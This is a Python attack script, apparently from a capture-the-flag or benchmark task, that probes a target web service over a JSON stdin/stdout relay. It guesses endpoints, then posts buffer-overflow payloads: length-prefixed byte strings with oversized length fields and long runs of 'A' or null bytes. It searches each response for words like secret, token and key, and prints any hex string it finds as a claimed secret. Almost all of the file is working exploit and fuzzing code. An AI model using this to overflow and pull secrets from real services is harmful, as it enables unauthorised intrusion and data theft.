import json, sys, base64, re

def http(method, path, body=None, headers=None, body_hex=None):
    req = {"http": {"method": method, "path": path}}
    if body_hex is not None:
        req["http"]["body_hex"] = body_hex
    elif body is not None:
        req["http"]["body"] = body
    if headers:
        req["http"]["headers"] = headers
    print(json.dumps(req))
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return None
    return json.loads(line)

found = []

# Step 1: discover endpoints
root = http("GET", "/")
if root:
    body = base64.b64decode(root.get("body_b64", "")).decode("utf-8", "replace")
    print("ROOT:", body[:2000])
    # look for paths in the page
    paths = set(re.findall(r'["\'](/[a-zA-Z0-9_/]+)["\']', body))
    paths.update(["/parse", "/record", "/records", "/submit", "/api/parse", "/api/record", "/api/records", "/v1/parse", "/v1/record", "/upload", "/data", "/process", "/handle"])
else:
    paths = ["/parse", "/record", "/records", "/submit", "/api/parse", "/api/record", "/api/records"]

# Step 2: probe each endpoint with GET
for p in sorted(paths):
    try:
        r = http("GET", p)
        if r:
            b = base64.b64decode(r.get("body_b64", "")).decode("utf-8", "replace")
            print(f"GET {p} -> {r.get('status')} {b[:300]}")
    except Exception as e:
        print(f"GET {p} ERR {e}")

# Step 3: try to trigger overflow with various payloads
# Common format: [len_byte][data] or [2-byte len][data] or [4-byte len][data]
payloads = []

# 1-byte length, large value
for L in [0xFF, 0x80, 0x40, 0x20, 0x10]:
    payloads.append(("1byte", bytes([L]) + b"A" * L))
    payloads.append(("1byte0", bytes([L]) + b"\x00" * L))

# 2-byte big-endian length
for L in [0xFFFF, 0x8000, 0x0100, 0x0080, 0x0040, 0x0020]:
    payloads.append(("2be", L.to_bytes(2, "big") + b"A" * min(L, 300)))
    payloads.append(("2le", L.to_bytes(2, "little") + b"A" * min(L, 300)))

# 4-byte big-endian length
for L in [0xFFFFFFFF, 0x7FFFFFFF, 0x00010000, 0x00008000, 0x00000100, 0x00000080]:
    payloads.append(("4be", L.to_bytes(4, "big") + b"A" * min(L, 300)))
    payloads.append(("4le", L.to_bytes(4, "little") + b"A" * min(L, 300)))

# Just raw large data
for sz in [64, 128, 256, 512, 1024, 4096]:
    payloads.append((f"raw{sz}", b"A" * sz))
    payloads.append((f"raw0_{sz}", b"\x00" * sz))
    payloads.append((f"rawB_{sz}", b"B" * sz))

# Length-prefixed with count
for cnt in [0xFF, 0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01]:
    payloads.append((f"cnt{cnt}", bytes([cnt]) + b"A" * cnt * 16))

endpoints = sorted(paths)
secret = None

for ep in endpoints:
    for pname, pdata in payloads:
        try:
            r = http("POST", ep, body_hex=pdata.hex())
            if r:
                b = base64.b64decode(r.get("body_b64", "")).decode("utf-8", "replace")
                if any(kw in b.lower() for kw in ["secret", "flag", "token", "key", "overflow", "crash", "error", "exception"]):
                    print(f"HIT {ep} {pname} -> {r.get('status')} {b[:500]}")
                    found.append((ep, pname, b))
                    # try to extract hex secret
                    m = re.search(r'[0-9a-fA-F]{16,}', b)
                    if m:
                        secret = m.group(0)
        except Exception as e:
            pass

# Also try with Content-Type headers
for ep in endpoints:
    for pname, pdata in payloads[:10]:
        try:
            r = http("POST", ep, body_hex=pdata.hex(), headers={"Content-Type": "application/octet-stream"})
            if r:
                b = base64.b64decode(r.get("body_b64", "")).decode("utf-8", "replace")
                if any(kw in b.lower() for kw in ["secret", "flag", "token", "key", "overflow", "crash"]):
                    print(f"HIT2 {ep} {pname} -> {r.get('status')} {b[:500]}")
                    found.append((ep, pname, b))
                    m = re.search(r'[0-9a-fA-F]{16,}', b)
                    if m:
                        secret = m.group(0)
        except Exception as e:
            pass

print("FOUND:", len(found))
for ep, pname, b in found:
    print(f"  {ep} {pname}: {b[:200]}")

if not secret:
    # try to find any hex string in all found responses
    for ep, pname, b in found:
        m = re.search(r'[0-9a-fA-F]{32,}', b)
        if m:
            secret = m.group(0)
            break

print(f"SECRET:{secret}")
print(f'CLAIM:{{"secret_hex": "{secret or ""}"}}')